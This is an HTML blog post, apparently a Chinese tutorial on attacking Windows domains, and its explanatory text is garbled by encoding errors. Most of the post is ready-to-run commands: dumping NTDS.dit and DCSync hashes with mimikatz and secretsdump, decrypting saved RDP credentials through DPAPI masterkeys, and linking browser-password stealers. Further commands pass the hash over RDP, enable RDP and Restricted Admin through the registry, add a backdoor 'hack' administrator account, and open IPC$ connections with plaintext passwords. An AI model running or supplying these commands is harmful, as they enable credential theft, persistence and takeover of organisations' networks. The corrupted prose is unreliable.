<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.exe -system sys.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure>

<p>NTDSDumpEx</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTDSDumpEx -d ndts.dit -s sys.hive -o 1.txt</span><br></pre></td></tr></table></figure>

<p>åªæœ‰è´¦æˆ· hash å€¼,è¿˜æœ‰å¾ˆå¤šæ–¹å¼å’Œå·¥å…·æ”¯æŒï¼Œé¡ºæ‰‹å³å¯ã€‚</p>
<h3 id="åœ¨çº¿è¯»å–-NTDS"><a href="#åœ¨çº¿è¯»å–-NTDS" class="headerlink" title="åœ¨çº¿è¯»å– NTDS"></a>åœ¨çº¿è¯»å– NTDS</h3><p>ç›´æ¥ç”¨å·¥å…·è¯»å– NTDS æ–‡ä»¶ï¼Œä½†æ˜¯å¯èƒ½ä¼šè¢«æ€è½¯æ€ï¼Œè€Œä¸”å› ä¸ºåŸŸå†…å¯èƒ½ç”¨æˆ·è¾ƒå¤šå¯¼è‡´æ–‡ä»¶å¤§ï¼Œå¦‚æœç½‘ç»œä¸å¥½å¯èƒ½ä¼šå‡ºé—®é¢˜ã€‚</p>
<p>mimikatz:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync/domain:abc.com /all /csv (è¯»å–æ‰€æœ‰)</span><br><span class="line">lsadump::dcsync/domain:abc.com /user:administrator (è¯»å–æŒ‡å®šç”¨æˆ·)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/DLeJLvQ.png"></p>
<p>QuarksPWDump</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarksPWDump.exe --dump-hash-domain --ntds-file ntds.dit</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆéœ€è¦å¯¼å‡º ntds.dit æ–‡ä»¶</p>
<h2 id="Dcsync-åŸç†åŠæ”»å‡»"><a href="#Dcsync-åŸç†åŠæ”»å‡»" class="headerlink" title="Dcsync åŸç†åŠæ”»å‡»"></a>Dcsync åŸç†åŠæ”»å‡»</h2><p>Dcsync(domain Controler synchronization):åœ¨å†…ç½‘ä¸­ä¸€èˆ¬ä¸æ˜¯ä¸€ä¸ªåŸŸæ§ï¼Œä¼šæœ‰åŸŸæ ‘æˆ–è€…åŸŸæ£®æ—ç­‰ï¼ŒåŸŸæ§ä¹‹é—´æ˜¯è¦åŒæ­¥æ•°æ®çš„ï¼Œä¸åŒçš„åŸŸæ§ 15 åˆ†é’Ÿä¹‹é—´è¦å‘èµ·ä¸€æ¬¡æ•°æ®åŒæ­¥çš„è¯·æ±‚ï¼Œè¯·æ±‚é‡Œé¢å°±åŒ…å«åŒæ­¥çš„æ•°æ®ï¼Œè¿™é‡Œé‡‡ç”¨çš„åè®®æ˜¯ DRS(ç›®å½•å¤åˆ¶æœåŠ¡)ï¼Œè¿™ä¸ªå°±æ˜¯ DCsyncã€‚</p>
<p>2015 å¹´ 8 æœˆï¼Œæ–°ç‰ˆæœ¬çš„ Mimikatz,æ–°å¢åŠ äº† DCSync åŠŸèƒ½ã€‚è¯¥åŠŸèƒ½å¯ä»¥æ¨¡ä»¿ä¸€ä¸ªåŸŸæ§åˆ¶å™¨ï¼Œä»çœŸå®çš„åŸŸæ§åˆ¶å™¨ä¸­è¯·æ±‚æ•°æ®ï¼Œä¾‹å¦‚ç”¨æˆ·çš„å“ˆå¸Œã€‚è¯¥åŠŸèƒ½æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯ä¸ç”¨ç™»é™†åŸŸæ§åˆ¶å™¨ï¼Œå³å¯è¿œç¨‹é€šè¿‡åŸŸæ•°æ®åŒæ­¥å¤åˆ¶çš„æ–¹å¼è·å¾—åŸŸæ§åˆ¶å™¨ä¸Šçš„çš„æ•°æ®ã€‚è¿™ç§æ”»å‡»å°±å«åš DCsync æ”»å‡»ã€‚</p>
<p>å…³äº Dcsync çš„åˆ©ç”¨æ€è·¯</p>
<p>1ã€æ‰¾åˆ°æœ‰æƒé™çš„ç”¨æˆ·ï¼Œä»è€Œè¿œç¨‹è¯»å–åŸŸæ§ç”¨æˆ·ä¿¡æ¯ï¼Œå¯ä»¥è¿›è¡Œ PTHã€é»„é‡‘ç™½é“¶ç¥¨æ®æ”»å‡»</p>
<p>2ã€å¦‚æœæ§åˆ¶äº†åŸŸæ§ï¼Œå¯ä»¥åœ¨åŸŸæ§æ·»åŠ ä¸€ä¸ªç®¡ç†å‘˜è´¦å·ä»è€Œè¿›è¡Œæƒé™ç»´æŒ</p>
<p>3ã€å¯ä»¥æ·»åŠ ä¸€ä¸ªæ™®é€šçš„ç”¨æˆ·ï¼Œä¿®æ”¹ ACL ä»è€Œå®ç°å¯ä»¥ä½¿ç”¨ Dcsync,è¿›è¡Œæƒé™ç»´æŒã€‚ä»¥ä¸‹ç”¨æˆ·å¯ä»¥è¿è¡Œ DRS æœåŠ¡ï¼š</p>
<ul>
<li>1.Administrators ç»„å†…çš„ç”¨æˆ·</li>
<li>2.Domain Admins ç»„å†…çš„ç”¨æˆ·</li>
<li>3.Enterprise Admins ç»„å†…çš„ç”¨æˆ·</li>
<li>4.åŸŸæ§åˆ¶å™¨çš„è®¡ç®—æœºå¸æˆ·</li>
<li>5.åŸŸæ§ system</li>
</ul>
<h3 id="dcsync-è¿œç¨‹è¯»å–åŸŸæ§-hash"><a href="#dcsync-è¿œç¨‹è¯»å–åŸŸæ§-hash" class="headerlink" title="dcsync è¿œç¨‹è¯»å–åŸŸæ§ hash"></a>dcsync è¿œç¨‹è¯»å–åŸŸæ§ hash</h3><p>éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥è¿è¡Œ drs æœåŠ¡çš„ç”¨æˆ·ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:gouzi.com /all /csv&quot; &quot;exit&quot;&gt;1.txt</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæƒé™ä¸å¤Ÿåˆ™å‡ºç°ä¸‹é¢çš„æç¤º<br><img src="https://i.imgur.com/0VXCL0g.png"></p>
<p>secretsdump</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell secretsdump.exe åŸŸå/administrator:å¯†ç @ip</span><br><span class="line"></span><br><span class="line">shell secretsdump.exe gouzi/administrator:admin123@192.168.192.10</span><br></pre></td></tr></table></figure>

<h3 id="dcsync-è¿œç¨‹è¯»å–æ˜æ–‡å¯†ç "><a href="#dcsync-è¿œç¨‹è¯»å–æ˜æ–‡å¯†ç " class="headerlink" title="dcsync è¿œç¨‹è¯»å–æ˜æ–‡å¯†ç "></a>dcsync è¿œç¨‹è¯»å–æ˜æ–‡å¯†ç </h3><p>å…¶å®æœ‰ HASH è¶³å¤Ÿäº†ï¼Œä½†æ˜¯å¦‚æœåœ¨åˆ›å»ºç”¨æˆ·çš„æ—¶å€™å‹¾é€‰äº†â€ä½¿ç”¨å¯é€†åŠ å¯†å­˜å‚¨å¯†ç â€çš„å±æ€§ï¼Œé‚£ä¹ˆ dcsync å°±å¯ä»¥ç›´æ¥è¯»å–å‡ºæ˜æ–‡è´¦å·å¯†ç ã€‚</p>
<h2 id="RDP-å¯†ç æŠ“å–"><a href="#RDP-å¯†ç æŠ“å–" class="headerlink" title="RDP å¯†ç æŠ“å–"></a>RDP å¯†ç æŠ“å–</h2><p>åŸç†</p>
<p>åœ¨å¹³æ—¶çš„å·¥ä½œä¸­ï¼Œç®¡ç†å‘˜ä¸ºäº†æ–¹ä¾¿ç®¡ç†è®¡ç®—æœºï¼Œç»å¸¸ä¼šè¿›è¡Œè¿œç¨‹æ¡Œé¢è¿æ¥ï¼Œç”±äºæ¯æ¬¡éƒ½éœ€è¦è¾“å…¥å¯†ç è§‰å¾—éº»çƒ¦ï¼Œå°±ç‚¹å‡»äº†ä¿ç•™å‡­æ®ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯å¯é€†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†ä¿å­˜çš„å¯†ç è¿›è¡Œè¿˜åŸã€‚</p>
<p>å¼€å¯è¿œç¨‹ 3389</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v PortNumber æŸ¥çœ‹ RDP ç«¯å£(<span class="number">0</span>xd3d ä¸º <span class="number">3389</span>)</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f å¼€å¯</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">11111111</span> /f å…³é—­</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> /a %userprofile%\AppData\Local\Microsoft\Credentials\* :æŸ¥çœ‹ RDP å‡­æ®ï¼ˆå¯ç ´è§£æ˜æ–‡è´¦å·å¯†ç ï¼‰</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>è¿˜åŸçš„åŸç†ï¼šWindows é€šè¿‡ MasterKey å°†å¯†ç åŠ å¯†åä¿å­˜åœ¨æœ¬åœ°ï¼Œç”±äº Windowsè¿˜éœ€è¦è§£å¯†ä½¿ç”¨è¿™ä¸ªå¯†ç ï¼Œæ‰€ä»¥è¿™ä¸ªè¿‡ç¨‹æ˜¯å¯é€†ï¼Œä¹Ÿæ­£å› ä¸ºè¿™ä¸€ç¼˜ç”±ï¼Œæˆ‘ä»¬åªè¦æ‹¿åˆ° MasterKey å°±èƒ½å°†å¯†ç è§£å‡ºæ¥ã€‚</p>
<p>å¯»æ‰¾ã€æŸ¥çœ‹ RDP å‡­æ®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹ RDP è¿æ¥è®°å½•</span><br><span class="line">cmdkey /l</span><br><span class="line"></span><br><span class="line">æŸ¥æ‰¾æœ¬åœ° Credentials</span><br><span class="line">dir /a %userprofile%\appdata\local\microsoft\credentials\*</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/I8Ankov.png"></p>
<p>åœ¨çº¿è¯»å–</p>
<p>1ã€è¯»å–å‡­æ®,æ‰¾åˆ° Matserkey çš„ guid å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /a %userprofile%\appdata\local\microsoft\credentials\*</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/OOtsn6J.png" alt="x|700x250"></p>
<ul>
<li>36100E4F8DF719F103EAECB55C8B2DBB</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz dpapi::cred /in:C:\Users\Administrator\appdata\local\microsoft\credentials\36100E4F8DF719F103EAECB55C8B2DBB</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/vMBRWdY.png" alt="x|700x250"></p>
<ul>
<li>ç¡®è®¤guid:{6306f025-f7b1-4720-85b6-63394deeae61}</li>
</ul>
<p>2ã€æ ¹æ® guid æ‰¾åˆ°å†…å­˜ä¸­çš„ Materkey</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::dpapi</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/fxAD4BT.png" alt="x|900x400"><br><img src="https://i.imgur.com/8A4xmVl.png" alt="x|900x250"></p>
<ul>
<li>MasterKey:97725b268216595b2fc6fdb1c5e03c39dff5ff56b7cbd3dd656feff0525f31eef00bcafb4260554982b967072d06bc2e47509cb98f79fd08cdc115f449b71a9a</li>
</ul>
<p>3ã€åˆ©ç”¨ masterkey å€¼è§£å¯† RDP å‡­æ®å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\Administrator\appdata\local\microsoft\credentials\36100E4F8DF719F103EAECB55C8B2DBB /masterKey:97725b268216595b2fc6fdb1c5e03c39dff5ff56b7cbd3dd656feff0525f31eef00bcafb4260554982b967072d06bc2e47509cb98f79fd08cdc115f449b71a9a</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/skX6GcZ.png" alt="x|700x250"><br><img src="https://i.imgur.com/ujDA0HP.png" alt="x|700x250"></p>
<ul>
<li>ç ´è§£å‡ºè´¦å·å¯†ç </li>
</ul>
<h2 id="åº”ç”¨è½¯ä»¶å¯†ç æŠ“å–"><a href="#åº”ç”¨è½¯ä»¶å¯†ç æŠ“å–" class="headerlink" title="åº”ç”¨è½¯ä»¶å¯†ç æŠ“å–"></a>åº”ç”¨è½¯ä»¶å¯†ç æŠ“å–</h2><h3 id="æµè§ˆå™¨å¯†ç æŠ“å–"><a href="#æµè§ˆå™¨å¯†ç æŠ“å–" class="headerlink" title="æµè§ˆå™¨å¯†ç æŠ“å–"></a>æµè§ˆå™¨å¯†ç æŠ“å–</h3><p>æµè§ˆå™¨ä¸­ä¿å­˜ç€è´¦å·å¯†ç ã€å†å²è®°å½•ã€ä¹¦ç­¾ç­‰é‡è¦ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯å¯¹å†…ç½‘æ¸—é€ä¹Ÿå¾ˆé‡è¦ã€‚</p>
<p>ä¸‹é¢ä¸¤ç§å·¥å…·çš†ä¸ºç›´æ¥è¿è¡Œå³å¯ï¼Œä½¿ç”¨æ–¹æ³•éå¸¸ç®€å•ï¼ŒåŸç†å°±æ˜¯æ‰¾åˆ°æµè§ˆå™¨ä¿å­˜æ•°æ®çš„è·¯å¾„ï¼Œç„¶åè§£å¯†ã€‚</p>
<p>1ã€BrowserGhost</p>
<p>å¯æŠ“å–æµè§ˆå™¨å¯†ç ï¼Œå®ç° system æŠ“æœºå™¨ä¸Šå…¶ä»–ç”¨æˆ·çš„æµè§ˆå™¨å¯†ç ã€‚ä¸»è¦é’ˆå¯¹è°·æ­Œã€‚</p>
<p>åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://github.com/QAX-A-TEAM/BrowserGhost">https://github.com/QAX-A-TEAM/BrowserGhost</a></p>
<p>2ã€Sharp-HackBrowserData</p>
<p>å¯æŠ“å–è°·æ­Œã€ç«ç‹ã€IE ç­‰å¸¸è§æµè§ˆå™¨çš„å¯†ç ã€‚</p>
<p>åœ°å€:<a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p>
<p>3ã€å…¶ä»–è½¯ä»¶å¯†ç æŠ“å–</p>
<ul>
<li>SharpDecryptPwd-master å¯¹å¯†ç å·²ä¿å­˜åœ¨ Windows ç³»ç»Ÿä¸Šçš„éƒ¨åˆ†ç¨‹åºè¿›è¡Œè§£æï¼ŒåŒ…æ‹¬ Navicat,TeamViewer,FileZilla,VinSCP,Xmangager ç³»åˆ—äº§å“</li>
<li>LaZagneæ˜¯ç”¨äºå¼€æºåº”ç”¨ç¨‹åºè·å–å¤§é‡çš„å¯†ç å­˜å‚¨åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šã€‚æ¯ä¸ªè½¯ä»¶éƒ½ä½¿ç”¨ä¸åŒçš„æŠ€æœ¯ï¼ˆæ˜æ–‡ã€APã€è‡ªå®šä¹‰ç®—æ³•ã€æ•°æ®åº“ç­‰)å­˜å‚¨å…¶å¯†ç ã€‚å¼€å‘æ­¤å·¥å…·çš„ç›®çš„æ˜¯ä¸ºæœ€å¸¸ç”¨çš„è½¯ä»¶æŸ¥æ‰¾è¿™äº›å¯†ç ã€‚ä»¥ä¸Šå·¥å…· CS æ’ä»¶ä¸­é›†æˆã€‚</li>
</ul>
<h2 id="å†…ç½‘æ¨ªå‘ç§»åŠ¨"><a href="#å†…ç½‘æ¨ªå‘ç§»åŠ¨" class="headerlink" title="å†…ç½‘æ¨ªå‘ç§»åŠ¨"></a>å†…ç½‘æ¨ªå‘ç§»åŠ¨</h2><p>åœ¨å†…ç½‘æ¸—é€ä¸­ï¼ŒåŸŸå†…æ¨ªå‘ç§»åŠ¨æ˜¯ä¸€ç§å¸¸è§çš„æ”»å‡»æ‰‹æ³•ã€‚æ”»å‡»è€…ä¼šåˆ©ç”¨æ­¤æŠ€æœ¯ï¼Œä»¥è¢«æ”»é™·çš„ç³»ç»Ÿä¸ºè·³æ¿ï¼Œè®¿é—®åŸŸå†…å…¶ä»–ä¸»æœºï¼Œæ‰©å¤§èµ„äº§(åŒ…æ‹¬è·³æ¿æœºä¸­çš„æ–‡æ¡£å’Œå­˜å‚¨çš„å‡­è¯ï¼Œä»¥åŠé€šè¿‡è·³æ¿æœºè¿æ¥çš„æ•°æ®åº“ï¼ŒåŸŸæ§åˆ¶å™¨ç­‰å…¶ä»–é‡è¦èµ„äº§)ã€‚é€šè¿‡æ­¤ç±»æ”»å‡»æŠ€æœ¯ï¼Œæ”»å‡»è€…æœ€ç»ˆå¾ˆå¯èƒ½è·å–åˆ°åŸŸæ§åˆ¶å™¨çš„è®¿é—®æƒé™ï¼Œç”šè‡³æ§åˆ¶æ•´ä¸ªå†…ç½‘çš„æœºå™¨æƒé™ã€‚</p>
<p>æ¨ªå‘ç§»åŠ¨çš„ç›®æ ‡ä¸€èˆ¬éœ€è¦é€‰æ‹©å…·æœ‰ä»·å€¼çš„æœºå™¨ï¼Œä¾‹å¦‚åŸŸæ§ã€åŸŸç®¡ç†å‘˜ç™»å½•è¿‡çš„æœåŠ¡å™¨ã€è¿ç»´æœºå™¨ã€æ–‡ä»¶æœåŠ¡å™¨ã€æ•°æ®åº“æœåŠ¡å™¨ã€OA ç³»ç»ŸæœåŠ¡å™¨ã€é‡è¦ä¸ªäººç”µè„‘ç­‰ã€‚</p>
<p>æ¨ªå‘ç§»åŠ¨å¸¸è§çš„æ–¹æ³•ï¼š<br>â€¢ WEB æ¼æ´<br>â€¢ ç³»ç»Ÿæ¼æ´<br>â€¢ è¿œç¨‹æ¡Œé¢<br>â€¢ è´¦å·å¯†ç ï¼ˆPTHã€PTTã€PTKã€WMICâ€¦ï¼‰<br>â€¢ ä¸å®‰å…¨çš„é…ç½®ï¼ˆæ¯”å¦‚ dcsync æ»¥ç”¨ã€å§”æ´¾æ»¥ç”¨ï¼‰</p>
<h3 id="è¿œæ§è½¯ä»¶"><a href="#è¿œæ§è½¯ä»¶" class="headerlink" title="è¿œæ§è½¯ä»¶"></a>è¿œæ§è½¯ä»¶</h3><p>ä¸ºäº†å›¾å½¢åŒ–æ§åˆ¶å¯¹æ–¹æœºå™¨ã€‚</p>
<h4 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h4><p>è¿œç¨‹æ¡Œé¢åè®®(RDP)æ˜¯ä¸€ä¸ªå¤šé€šé“(multi-.channel)çš„åè®®ï¼Œè®©ä½¿ç”¨è€…ï¼ˆæ‰€åœ¨è®¡ç®—æœºç§°ä¸ºç”¨æˆ·ç«¯æˆ–â€™æœ¬åœ°è®¡ç®—æœº)è¿ä¸Šæä¾›å¾®è½¯ç»ˆç«¯æœºæœåŠ¡çš„è®¡ç®—æœºï¼ˆç§°ä¸ºæœåŠ¡ç«¯æˆ–â€™è¿œç¨‹è®¡ç®—æœºâ€™ï¼‰è¿œç¨‹æ¡Œé¢çš„åˆ©ç”¨æ¡ä»¶ï¼š</p>
<p>1ã€å¼€å¯äº† 3389 ç«¯å£</p>
<p>2ã€é˜²ç«å¢™ç­‰å®‰å…¨è®¾å¤‡æ²¡æœ‰ç¦æ­¢</p>
<p>3ã€ç½‘ç»œç•…é€š</p>
<p>4ã€æ‹¥æœ‰è´¦å·å’Œå¯†ç æˆ–è€… Hashï¼Œï¼ˆå¯ä»¥æ˜¯æœ¬èº«çš„è´¦å·ä¹Ÿå¯ä»¥æ˜¯è‡ªå·±æ·»åŠ çš„)</p>
<p>æ–¹æ³•ä¸€ï¼š</p>
<p>æŸ¥è¯¢æ³¨å†Œè¡¨ æŸ¥çœ‹ RDP ç«¯å£</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp&quot; /v PortNumber   æŸ¥çœ‹ RDP ç«¯å£(0xd3d ä¸º 3389)</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹ RDP åŠŸèƒ½æ˜¯å¦å¯ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæœªå¯ç”¨ ä¿®æ”¹æ³¨å†Œè¡¨å¯ç”¨ RDP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>

<p>æŠ“å–æœºå™¨æ˜æ–‡å¯†ç ç™»å½•å³å¯:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>æ–¹å¼äºŒï¼š</p>
<p>å€ŸåŠ© mimikatz ä½¿ç”¨ hash ç™»å½•(å±äº pth çš„ä¸€ç§):</p>
<p>æŸ¥è¯¢æ³¨å†Œè¡¨ï¼Œçœ‹çœ‹æ˜¯å¦å¼€å¯ Restricted Admin mode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query HKLM\System\CurrentControlSet\Control\Lsa</span><br></pre></td></tr></table></figure>

<p>å¼€å¯ Restricted Admin mode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>

<p>privilege::debug</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:zs /domain:192.168.197.20 /ntlm:f31f1532113ca4a22e0a87426713d565&quot; /run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>æ³¨æ„ï¼Œä½¿ç”¨ rdp çš„ pth æ”»å‡»æ—¶ï¼Œå…³äº RestrictedAdmin Mode çš„ä½¿ç”¨ï¼Œéœ€</li>
</ul>
<p>è¦è¿æ¥åŒæ–¹éƒ½æ”¯æŒè¯¥åŠŸèƒ½ã€‚ï¼ˆè‡ª Windows8.1 ä¹‹åæ”¯æŒè¯¥åŠŸèƒ½ï¼Œå¦‚æœ</p>
<p>WS2012 ç­‰ï¼Œä½†æ˜¯éƒ¨åˆ†å®¶åº­ç‰ˆä¸æ”¯æŒï¼Œå¦‚ win10 å®¶åº­ç‰ˆï¼‰</p>
<p>æ–¹å¼ä¸‰ï¼š</p>
<p>åˆ›å»ºè´¦æˆ·è¿›è¡Œè¿œç¨‹æ¡Œé¢è¿æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user hack hack@123 /add</span><br><span class="line"></span><br><span class="line">net localgroup Administrators hack /add</span><br></pre></td></tr></table></figure>

<p>RDP ç™»å½•ä¹‹åå¯ä»¥æŸ¥çœ‹å½“å‰æœºå™¨ RDP è®°å½•ã€SSH è¿æ¥ç¨‹åºç­‰ï¼Œå¦‚æœæœ‰åˆ™ç›´æ¥æ¨ªå‘</p>
<h2 id="IPC-æ¨ªå‘ç§»åŠ¨"><a href="#IPC-æ¨ªå‘ç§»åŠ¨" class="headerlink" title="IPC$æ¨ªå‘ç§»åŠ¨"></a>IPC$æ¨ªå‘ç§»åŠ¨</h2><h3 id="æ¦‚è¿°å’Œè¿æ¥æ–¹å¼"><a href="#æ¦‚è¿°å’Œè¿æ¥æ–¹å¼" class="headerlink" title="æ¦‚è¿°å’Œè¿æ¥æ–¹å¼"></a>æ¦‚è¿°å’Œè¿æ¥æ–¹å¼</h3><p>IPC(Internet Process Connection)å…±äº«ï¼Œæ˜¯ä¸ºäº†å®ç°è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ã€‚</p>
<p>IPC å¯ä»¥é€šè¿‡éªŒè¯ç”¨æˆ·åå’Œå¯†ç è·å¾—ç›¸åº”çš„æƒé™ï¼Œé€šå¸¸åœ¨è¿œç¨‹ç®¡ç†è®¡ç®—æœºå’ŒæŸ¥çœ‹è®¡ç®—æœºçš„å…±äº«èµ„æºæ—¶ä½¿ç”¨ã€‚é€šè¿‡ ipc$,å¯ä»¥ä¸ç›®æ ‡æœºå™¨å»ºç«‹è¿æ¥ã€‚åˆ©ç”¨è¿™ä¸ªè¿æ¥ï¼Œä¸ä»…å¯ä»¥è®¿é—®ç›®æ ‡æœºå™¨ä¸­çš„æ–‡ä»¶ï¼Œè¿›è¡Œä¸Šä¼ ã€ä¸‹è½½ç­‰æ“ä½œï¼Œè¿˜å¯ä»¥åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œå…¶ä»–å‘½ä»¤ï¼Œä»¥è·å–ç›®æ ‡æœºå™¨çš„ç›®å½•ç»“æ„ã€ç”¨æˆ·åˆ—è¡¨ç­‰ä¿¡æ¯ã€‚</p>
<p>æ–‡ä»¶å…±äº«æ˜¯æŒ‡ä¸»åŠ¨åœ¨ç½‘ç»œä¸Šå…±äº«è‡ªå·±çš„è®¡ç®—æœºæ–‡ä»¶ã€‚è€Œæ¯å°è®¡ç®—æœºéƒ½ä¼šæœ‰é»˜è®¤å…±äº«çš„æƒ…å†µï¼ŒåŒ…æ‹¬æ‰€æœ‰çš„é€»è¾‘ç›˜ï¼ˆC$ã€D$ã€E$ã€admin$ï¼‰ï¼Œåªéœ€è¦çŸ¥é“å¯¹æ–¹çš„è´¦å·å¯†ç ï¼Œå¯ä»¥å®ç°å¯¹è¿™äº›é»˜è®¤å…±äº«ç›®å½•çš„è®¿é—®ã€‚è€Œå¦‚æœå½“å‰ç”¨æˆ·çš„è´¦å·æ˜¯ administratorï¼Œç›®æ ‡æœºå™¨çš„è´¦æˆ· administratorå¯†ç ä¸å½“å‰ç”¨æˆ·çš„ä¸€è‡´ï¼Œä¸éœ€è¦è¾“å…¥å¯†ç å°±å¯ä»¥è®¿é—®ï¼Œé»˜è®¤ä¼šç”¨æœ¬åœ°ç›¸åŒçš„è´¦å·å¯†ç è¿›è¡Œè®¤è¯ã€‚(éæœ€é«˜ç®¡ç†å‘˜æƒé™ä¸å¤Ÿï¼Œæç¤ºæ‹’ç»è®¿é—®ã€‚)</p>
<p>&#x3D;&#x3D;è€Œåœ¨å†…ç½‘ä¸­ï¼Œå¯èƒ½å­˜åœ¨å¾ˆå¤šæœºå™¨çš„æœ¬åœ° administrator ç”¨æˆ·å¯†ç æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥èƒ½å¤Ÿç›´æ¥åˆ©ç”¨ã€‚&#x3D;&#x3D;</p>
<p>å¦‚æœåŒæ–¹å»ºç«‹äº† IPC è¿æ¥ï¼Œåˆ™å…±äº«æ–‡ä»¶æ— éœ€å†è¿›è¡Œè®¤è¯ã€‚</p>
<p>å…³äº IPC çš„å‘½ä»¤ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å»ºç«‹ IPC è¿æ¥</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ &quot;password&quot; /user:username</span><br><span class="line"></span><br><span class="line">net use \\åŸŸå\ipc$ &quot;password&quot; /user:åŸŸç”¨æˆ·</span><br><span class="line"></span><br><span class="line">net use \\192.168.255.10\ipc$ &quot;Win.2024&quot; /user:KEA\Administrator</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/ezYAnTB.png"></p>
